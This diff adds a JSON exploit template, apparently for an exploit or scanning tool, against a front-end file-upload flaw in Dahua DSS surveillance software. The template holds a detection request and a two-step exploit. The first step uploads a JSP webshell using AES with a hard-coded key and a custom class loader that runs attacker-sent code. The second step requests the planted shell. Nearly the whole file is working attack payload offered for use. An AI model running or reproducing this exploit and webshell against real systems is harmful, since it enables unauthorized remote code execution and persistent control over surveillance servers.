@@ -1,0 +1,38 @@
+{
+  "num": 2,
+  "name":"大华DSS前台文件上传",
+  "tag":"dahua",
+  "type":"upload",
+  "detail": {
+    "pocGet": "/publishing/publishing/material/file/video",
+    "pocPost": "id=1",
+    "header": {
+      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "pattern": "{\"status\":200}"
+  },
+  "exp": {
+    "step1": {
+      "expGet": "/publishing/publishing/material/file/video",
+      "expPost": "------WebKitFormBoundaryCJEleSRxsqS0lAFv\nContent-Disposition: form-data; name=\"Filedata\";filename=\"1.jsp\"\n\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*�ƥ:ޥ�\u000132Mmd5<�M16M\fؤޥ�\u0001rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
+      "header": {
+        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "pattern": "{\\{\"id\":[0-9]{1,3},\"path\":\"VIDEO/.*.jsp\"\\}}",
+      "pattern": "[0-9a-zA-Z]*.jsp"
+    },
+    "step2": {
+      "expGet": "/publishingImg/VIDEO/%s",
+      "header": {
+        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "pattern": ""
+    }
+  }
+}
